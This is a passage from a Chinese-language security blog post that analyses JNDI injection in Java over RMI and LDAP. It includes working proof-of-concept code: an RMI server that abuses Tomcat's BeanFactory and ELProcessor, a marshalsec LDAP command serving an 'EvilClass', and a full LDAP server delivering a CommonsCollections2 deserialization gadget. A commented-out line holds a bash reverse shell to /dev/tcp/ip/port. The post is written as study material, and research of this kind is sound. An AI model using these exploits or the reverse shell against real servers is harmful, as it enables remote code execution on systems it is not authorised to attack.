class="hljs-variable">propName</span> <span class="hljs-operator">=</span> ra.getType();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> (String)ra.getContent();<br>        Object[] valueArray = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">1</span>];<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> forced.get(propName);<br>        <span class="hljs-keyword">if</span> (method != <span class="hljs-literal">null</span>) &#123;<br>            valueArray[<span class="hljs-number">0</span>] = value;<br>            method.invoke(bean, valueArray);<br>        &#125;<br>        <span class="hljs-comment">// ...</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<p> 这里首先会通过反射实例化类，但注意调用的是无参构造方法。接着获取forceString所有的引用地址，并通过逗号分隔，每个分隔值中如果出现等号，则将逗号右侧的值作为setter方法的别名，左侧作为参数引用。之后会将其放入forced这个map当中。后续会调用所有的setter方法，参数为<code>RefAddr</code>的值（单参数），如此我们可以构造来实例化任意类并调用任意方法，只需满足该类含有无参构造函数以及可利用方法为单个参数传递</p>
<ol>
<li><p><code>javax.el.ELProcessor#eval()</code> 可以通过eval方法执行EL表达式</p>
<p class='item-img' data-src='/2023/01/11/JNDI/image-20230108151835588.png'><img src="/2023/01/11/JNDI/image-20230108151835588.png" alt="image-20230108151835588"></p>
<p>因此整个绕过流程，首先<code>ref.getFactoryClassLocation()</code>需要为空，也就是在设置引用类是设置属性factoryClassLocation为空即可；接着在<code>NamingManager.getObjectInstance()</code>成功实例化了本地存在的工厂类<code>org.apache.naming.factory.BeanFactory</code>，后者通过<code>newInstance</code>调用目标类的无参构造创建实例，并通过预设值的setter别名机制调用到<code>javax.el.ELProcessor#eval()</code>从而出发最终的EL表达式注入</p>
<p>POC<strong>构造</strong></p>
<p>这里的引用类利用了<code>ResourceRef</code>，它是tomcat中对某个资源的引用，构造函数如下</p>
<p class='item-img' data-src='/2023/01/11/JNDI/image-20230108152530879.png'><img src="/2023/01/11/JNDI/image-20230108152530879.png" alt="image-20230108152530879"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String args[])</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>            <span class="hljs-type">ResourceRef</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResourceRef</span>(<span class="hljs-string">&quot;javax.el.ELProcessor&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-literal">true</span>, <span class="hljs-string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>, <span class="hljs-literal">null</span>);<br>            ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;forceString&quot;</span>, <span class="hljs-string">&quot;x=eval&quot;</span>));<br>            <span class="hljs-comment">// ref.add(new StringRefAddr(&quot;x&quot;, &quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;bash&#x27;,&#x27;-c&#x27;,&#x27;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&#x27;]).start()\&quot;)&quot;));</span><br>            ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;x&quot;</span>, <span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;open -a Calculator.app\&quot;)&quot;</span>));<br><br>            <span class="hljs-type">ReferenceWrapper</span> <span class="hljs-variable">referenceWrapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceWrapper</span>(ref);<br>            registry.bind(<span class="hljs-string">&quot;calc&quot;</span>, referenceWrapper);<br>            System.err.println(<span class="hljs-string">&quot;Server ready&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            System.err.println(<span class="hljs-string">&quot;Server exception: &quot;</span> + e.toString());<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure>
<p>这里<code>x</code>即引用到的参数，其值即为<code>javax.el.ELProcessor#eval()</code>要执行的参数内容</p>
<p class='item-img' data-src='/2023/01/11/JNDI/image-20230108170602879.png'><img src="/2023/01/11/JNDI/image-20230108170602879.png" alt="image-20230108170602879"></p>
</li>
<li><p>groovy 这个类之后再看</p>
</li>
</ol>
<p><strong>绕过总结：</strong></p>
<blockquote>
<ul>
<li><p>Server:</p>
<p>使用<code>ResourceRef</code>构造的<code>beanClass</code>，这种利用方式构造的<code>beanClass</code>是<code>javax.el.ELProcessor</code>。<br><code>ELProcessor</code>中有个<code>eval(String)</code>方法可以执行<code>EL</code>表达式,<code>javax.el.ELProcessor</code>是<code>Tomcat8</code>中的库，所以仅限<code>Tomcat8</code>及更高版本环境下可以通过该库进行攻击。</p>
</li>
<li><p>Client:</p>
<p>远程 <code>RMI</code> 服务器返回的 <code>Reference</code> 对象中不指定 <code>Factory</code> 的 <code>codebase</code>，且使用本地的<code>factory</code>，如<code>BeanFactory</code>，以此绕过 <code>trustURLCodebase</code> 报错，执行 <code>NamingManager</code> ；<br>在<code>factory</code>的静态代码块、代码块、构造函数和<code>getObjectInstance</code>方法任意一个里面构造<code>payload</code>，即可在 <code>NamingManager</code> 中执行。</p>
</li>
</ul>
</blockquote>
<p><strong>工具：</strong></p>
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/welk1n/JNDI-Injection-Bypass">https://github.com/welk1n/JNDI-Injection-Bypass</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/mbechler/marshalsec">https://github.com/mbechler/marshalsec</a></li>
</ul>
</li>
</ul>
<h4 id="JNDI-LDAP"><a href="#JNDI-LDAP" class="headerlink" title="JNDI_LDAP"></a>JNDI_LDAP</h4><p>LDAP服务是一种树型数据库，其中存在特殊的属性可以用来实现Java对象以序列化数据或者引用的方式来存储，这时如果被客户端解析的话，就可以引起远程代码执行</p>
<ul>
<li><p>低版本JDK运行</p>
<p>工具利用marshalsec开启ldap服务</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:8000/\#EvilClass 8088<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='/2023/01/11/JNDI/image-20230109233427089.png'><img src="/2023/01/11/JNDI/image-20230109233427089.png" alt="image-20230109233427089"></p>
<p>由于LDAP服务的<code>Reference</code>远程加载<code>Factory</code>类并不是使用的<code>RMI Class Loader</code>机制，因此不受<code>trustURLCodebase</code>限制（8u191）</p>
<p>恶意类放在服务器下</p>
<p class='item-img' data-src='/2023/01/11/JNDI/image-20230109232706171.png'><img src="/2023/01/11/JNDI/image-20230109232706171.png" alt="image-20230109232706171"></p>
<p>低版本结果</p>
<p class='item-img' data-src='/2023/01/11/JNDI/image-20230109234255832.png'><img src="/2023/01/11/JNDI/image-20230109234255832.png" alt="image-20230109234255832"></p>
<p>高版本结果</p>
<p class='item-img' data-src='/2023/01/11/JNDI/image-20230109234336910.png'><img src="/2023/01/11/JNDI/image-20230109234336910.png" alt="image-20230109234336910"></p>
</li>
<li><p>调用流程分析</p>
<p>前面的调用栈与RMI类似，lookup之后decodeObject</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">decodeObject:235, Obj (com.sun.jndi.ldap)<br>c_lookup:1051, LdapCtx (com.sun.jndi.ldap)<br>p_lookup:542, ComponentContext (com.sun.jndi.toolkit.ctx)<br>lookup:177, PartialCompositeContext (com.sun.jndi.toolkit.ctx)<br>lookup:205, GenericURLContext (com.sun.jndi.toolkit.url)<br>lookup:94, ldapURLContext (com.sun.jndi.url.ldap)<br>lookup:417, InitialContext (javax.naming)<br>main:7, Client<br></code></pre></td></tr></table></figure>
<p>跟进<code>com.sun.jndi.ldap.Obj.java#decodeObject()</code>，该方法会对服务端传来的数据根据不同的类型进行解码处理，类型可以是序列化数据或者引用对象，这里以引用对象为例</p>
<p class='item-img' data-src='/2023/01/11/JNDI/image-20230109235346841.png'><img src="/2023/01/11/JNDI/image-20230109235346841.png" alt="image-20230109235346841"></p>
</li>
</ul>
<p>之后会调用<code>decodeReference()</code>方法，其会获取服务端传来的属性值并构建一个<code>Reference</code>实例</p>
<p>这里便</p>
<p class='item-img' data-src='/2023/01/11/JNDI/image-20230110000012777.png'><img src="/2023/01/11/JNDI/image-20230110000012777.png" alt="image-20230110000012777"></p>
<p>接着会返回到<code>c_lookup</code>类中执行<code>DirectoryManager#getObjectInstance()</code> 其中var3为构建的引用类对象</p>
<p class='item-img' data-src='/2023/01/11/JNDI/image-20230110002710554.png'><img src="/2023/01/11/JNDI/image-20230110002710554.png" alt="image-20230110002710554"></p>
<p>这里可以看到首先将参数refInfo强转为<code>Reference</code>类实例，接着调用<code>getFactoryClassName</code>获取工厂类名，然后通过<code>getObjectFactoryFromReference()</code>方法根据工厂类名获取远程调用类。我们看下这里的具体实现</p>
<p class='item-img' data-src='/2023/01/11/JNDI/image-20230110003154131.png'><img src="/2023/01/11/JNDI/image-20230110003154131.png" alt="image-20230110003154131"></p>
<p>其首先会从本地加载目标类，如果找不到的话再通过制定的工厂类位置来远程加载。整个过程没有<code>URLCodebase</code>限制</p>
<p class='item-img' data-src='/2023/01/11/JNDI/image-20230110003430773.png'><img src="/2023/01/11/JNDI/image-20230110003430773.png" alt="image-20230110003430773"></p>
<ul>
<li><p>高版本限制</p>
<blockquote>
<p>在高版本 <code>JDK</code> 中需要通过 <code>com.sun.jndi.ldap.object.trustURLCodebase</code> 选项去启用。这个限制在 <code>JDK 11.0.1</code>、<code>8u191</code>、<code>7u201</code>、<code>6u211</code> 版本时加入，略晚于 <code>RMI</code> 的远程加载限制。</p>
</blockquote>
<p>限制位置加载了<code>helper.loadClass()</code>，也就是<code>VersionHelper12#loadClass()</code>中</p>
<p class='item-img' data-src='/2023/01/11/JNDI/image-20230110004205440.png'><img src="/2023/01/11/JNDI/image-20230110004205440.png" alt="image-20230110004205440"></p>
</li>
<li><p>其他几种利用方式</p>
<p><strong>使用序列化数据触发Gadget</strong></p>
<p>在<code>com.sun.jndi.ldap.Obj.java#decodeObject()</code>中通过<code>JAVA_ATTRIBUTES[SERIALIZED_DATA]</code>检测服务端传来的是否为序列化数据，进而调用<code>deserializeObject()</code>方法</p>
<p class='item-img' data-src='/2023/01/11/JNDI/image-20230111103858637.png'><img src="/2023/01/11/JNDI/image-20230111103858637.png" alt="image-20230111103858637"></p>
</li>
</ul>
<p>跟进可以看到存在原生反序列化<code>readObject()</code></p>
<p class='item-img' data-src='/2023/01/11/JNDI/image-20230111104131730.png'><img src="/2023/01/11/JNDI/image-20230111104131730.png" alt="image-20230111104131730"></p>
<p>改造<code>marchalsec</code>服务端程序的<code>sendResult()</code>部分即可，我这里的序列化数据以CC2为例</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LDAPRefServer1</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">LDAP_BASE</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;dc=example,dc=com&quot;</span>;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span> <span class="hljs-params">( String[] args )</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">port</span> <span class="hljs-operator">=</span> <span class="hljs-number">8088</span>;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">InMemoryDirectoryServerConfig</span> <span class="hljs-variable">config</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);<br>            config.setListenerConfigs(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryListenerConfig</span>(<br>                    <span class="hljs-string">&quot;listen&quot;</span>, <span class="hljs-comment">//$NON-NLS-1$</span><br>                    InetAddress.getByName(<span class="hljs-string">&quot;0.0.0.0&quot;</span>), <span class="hljs-comment">//$NON-NLS-1$</span><br>                    port,<br>                    ServerSocketFactory.getDefault(),<br>                    SocketFactory.getDefault(),<br>                    (SSLSocketFactory) SSLSocketFactory.getDefault()));<br><br>            config.addInMemoryOperationInterceptor(<span class="hljs-keyword">new</span> <span class="hljs-title class_">LDAPRefServer1</span>.OperationInterceptor(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(args[ <span class="hljs-number">0</span> ])));<br>            <span class="hljs-type">InMemoryDirectoryServer</span> <span class="hljs-variable">ds</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryDirectoryServer</span>(config);<br>            System.out.println(<span class="hljs-string">&quot;Listening on 0.0.0.0:&quot;</span> + port); <span class="hljs-comment">//$NON-NLS-1$</span><br>            ds.startListening();<br><br>        &#125;<br>        <span class="hljs-keyword">catch</span> ( Exception e ) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OperationInterceptor</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">InMemoryOperationInterceptor</span> &#123;<br><br>        <span class="hljs-keyword">private</span> URL codebase;<br><br><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         *</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-title function_">OperationInterceptor</span> <span class="hljs-params">( URL cb )</span> &#123;<br>            <span class="hljs-built_in">this</span>.codebase = cb;<br>        &#125;<br><br><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * &#123;<span class="hljs-doctag">@inheritDoc</span>&#125;</span><br><span class="hljs-comment">         *</span><br><span class="hljs-comment">         * <span class="hljs-doctag">@see</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processSearchResult</span> <span class="hljs-params">( InMemoryInterceptedSearchResult result )</span> &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">base</span> <span class="hljs-operator">=</span> result.getRequest().getBaseDN();<br>            <span class="hljs-type">Entry</span> <span class="hljs-variable">e</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Entry</span>(base);<br>            <span class="hljs-keyword">try</span> &#123;<br>                sendResult(result, base, e);<br>            &#125;<br>            <span class="hljs-keyword">catch</span> ( Exception e1 ) &#123;<br>                e1.printStackTrace();<br>            &#125;<br><br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getPayload</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>            String TemplatesImpl=<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;<br>            String AbstractTranslet=<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>;<br>            <span class="hljs-comment">// 恶意字节码部分构造</span><br>            <span class="hljs-type">ClassPool</span> <span class="hljs-variable">classPool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>            classPool.appendClassPath(AbstractTranslet);<br>            <span class="hljs-type">CtClass</span> <span class="hljs-variable">poc</span> <span class="hljs-operator">=</span> classPool.makeClass(<span class="hljs-string">&quot;POC&quot;</span>);<br>            poc.setSuperclass(classPool.get(AbstractTranslet));<br>            poc.makeClassInitializer().setBody(<span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);<br><br>            <span class="hljs-type">byte</span>[] evilCode = poc.toBytecode();<br>            <span class="hljs-comment">// TemplatesImpl 恶意加载类构造 sink</span><br>            <span class="hljs-type">Object</span> <span class="hljs-variable">templatesImpl</span> <span class="hljs-operator">=</span> Class.forName(TemplatesImpl).getDeclaredConstructor(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;&#125;).newInstance();<br>            <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> templatesImpl.getClass().getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>            field.setAccessible(<span class="hljs-literal">true</span>);<br>            field.set(templatesImpl, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;evilCode&#125;);<br><br>            <span class="hljs-type">Field</span> <span class="hljs-variable">field1</span> <span class="hljs-operator">=</span> templatesImpl.getClass().getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>            field1.setAccessible(<span class="hljs-literal">true</span>);<br>            field1.set(templatesImpl, <span class="hljs-string">&quot;whatever&quot;</span>);<br><br>            <span class="hljs-comment">// 构造gadget来连接 TemplatesImpl#newTransformer</span><br>            <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">transformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;&#125;);<br><br>            <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">comparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(transformer);<br><br>            <span class="hljs-comment">// 连接compare方法</span><br>            <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">queue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(<span class="hljs-number">2</span>);<br>            queue.add(<span class="hljs-number">1</span>);<br>            queue.add(<span class="hljs-number">2</span>);<br><br>            <span class="hljs-type">Field</span> <span class="hljs-variable">field2</span> <span class="hljs-operator">=</span> queue.getClass().getDeclaredField(<span class="hljs-string">&quot;comparator&quot;</span>);<br>            field2.setAccessible(<span class="hljs-literal">true</span>);<br>            field2.set(queue, comparator);<br><br>            <span class="hljs-type">Field</span> <span class="hljs-variable">field3</span> <span class="hljs-operator">=</span> queue.getClass().getDeclaredField(<span class="hljs-string">&quot;queue&quot;</span>);<br>            field3.setAccessible(<span class="hljs-literal">true</span>);<br>            field3.set(queue, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templatesImpl, templatesImpl&#125;);<br><br>            <span class="hljs-keyword">return</span> queue;<br>        &#125;<br><br><br>        <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sendResult</span> <span class="hljs-params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>            <span class="hljs-type">URL</span> <span class="hljs-variable">turl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-built_in">this</span>.codebase, <span class="hljs-built_in">this</span>.codebase.getRef().replace(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>).concat(<span class="hljs-string">&quot;.class&quot;</span>));<br>            System.out.println(<span class="hljs-string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="hljs-string">&quot; redirecting to &quot;</span> + turl);<br><br>            e.addAttribute(<span class="hljs-string">&quot;javaSerializedData&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Java</span>().marshal(getPayload()));<br>            result.sendSearchEntry(e);<br>            result.setResult(<span class="hljs-keyword">new</span> <span class="hljs-title class_">LDAPResult</span>(<span class="hljs-number">0</span>, ResultCode.SUCCESS));<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<p><strong>触发点2：</strong>第一种改造</p>
<p>关注<code>com.sun.jndi.ldap.Obj.java#decodeReference()</code>方法，其在重构<code>Reference</code>对象的基础之上，如果存在javaReferenceAddress属性还会继续构建该属性，满足特定条件可以也触发<code>deserializeObject()</code>方法</p>
<p class='item-img' data-src='/2023/01/11/JNDI/image-20230111112155439.png'><img src="/2023/01/11/JNDI/image-20230111112155439.png" alt="image-20230111112155439"></p>
<p>源码细节见：<a target="_blank" rel="noopener" href="http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/jdk8u232-ga/src/share/classes/com/sun/jndi/ldap/Obj.java">http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/jdk8u232-ga/src/share/classes/com/sun/jndi/ldap/Obj.java</a></p>
<p>需要满足的条件如下：</p>
<ol>
<li>第一个符号为分隔符</li>
<li>第一个分隔符和第二个分隔符之间，表示<code>Reference</code>的<code>position</code>，需要是整数类型</li>
<li>第二个分隔符到第三个分隔符之间，表示<code>type</code></li>
<li>第三个分隔符为双分隔符，用于表示为内容，之后的内容为序列化数据</li>
<li>序列化数据需要Base64编码</li>
</ol>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sendResult</span> <span class="hljs-params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>            <span class="hljs-type">URL</span> <span class="hljs-variable">turl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-built_in">this</span>.codebase, <span class="hljs-built_in">this</span>.codebase.getRef().replace(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>).concat(<span class="hljs-string">&quot;.class&quot;</span>));<br>            System.out.println(<span class="hljs-string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="hljs-string">&quot; redirecting to &quot;</span> + turl);<br><br>            e.addAttribute(<span class="hljs-string">&quot;javaClassName&quot;</span>, <span class="hljs-string">&quot;foo&quot;</span>);<br>            e.addAttribute(<span class="hljs-string">&quot;javaReferenceAddress&quot;</span>, <span class="hljs-string">&quot;$1$String$$&quot;</span>+<span class="hljs-keyword">new</span> <span class="hljs-title class_">Base64Encoder</span>().encode(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Java</span>().marshal(getPayload())));<br>            e.addAttribute(<span class="hljs-string">&quot;objectClass&quot;</span>, <span class="hljs-string">&quot;javaNamingReference&quot;</span>);<br>            result.sendSearchEntry(e);<br>            result.setResult(<span class="hljs-keyword">new</span> <span class="hljs-title class_">LDAPResult</span>(<span class="hljs-number">0</span>, ResultCode.SUCCESS));<br>        &#125;<br></code></pre></td></tr></table></figure>
<blockquote>
<p><code>JNDI-RMI</code>注入方式有：</p>
<ul>
<li><code>codebase</code>(<code>JDK 6u132</code>、<code>7u122</code>、<code>8u113</code>之前可以) </li>
<li>利用本地<code>Class Factory</code>作为<code>Reference Factory</code></li>
</ul>
<p><code>JNDI-LDAP</code>注入方式： </p>
<ul>
<li><code>codebase</code>(<code>JDK 11.0.1</code>、<code>8u191</code>、<code>7u201</code>、<code>6u211</code>之前可以) </li>
<li><code>serialize</code>（两个切入点）</li>
</ul>
</blockquote>
<h4 id="工具化利用"><a href="#工具化利用" class="headerlink" title="工具化利用"></a>工具化利用</h4><p>这里参考su18师傅和 welk1n 师傅的工具造个轮子，锻炼一下自己的工程化开发能力</p>
<p>之后新开一帖</p>
<h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><ul>
<li><a target="_blank" rel="noopener" href="https://github.com/su18/JNDI">https://github.com/su18/JNDI</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/mbechler/marshalsec">https://github.com/mbechler/marshalsec</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/welk1n/JNDI-Injection-Exploit/">https://github.com/welk1n/JNDI-Injection-Exploit/</a></li>
<li><a target="_blank" rel="noopener" href="https://tttang.com/archive/1611/">https://tttang.com/archive/1611/</a></li>
</ul>
<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2023/01/12/%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E7%9A%84%E5%AD%A6%E4%B9%A0/">← 下一篇 渗透的艺术——信息收集—-善用搜索引擎</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/01/06/%E5%8F%8D%E5%BC%B9Shell/">内网渗透——反弹Shell的各种姿势 上一篇 →</a></div></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="回到顶部" style="opacity: 0; display: none;">∧</a><a class="i-index" id="to-index" href="#toc-div" title="文章目录">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="切换主题"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">RacerZ</a></h1><div id="description"><p></p></div><div id="social-links"><a class="social" target="_blank" rel="noopener" href="https://github.com/RacerZ-fighting"><i class="fab fa-github" alt="GitHub"></i></a><a class="social" href="qiyizhang2002@foxmail.com"><i class="fa fa-envelope" alt="E-Mail"></i></a></div></div><div id="aside-block"><div id="toc-div"><h1>目录</h1><ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" 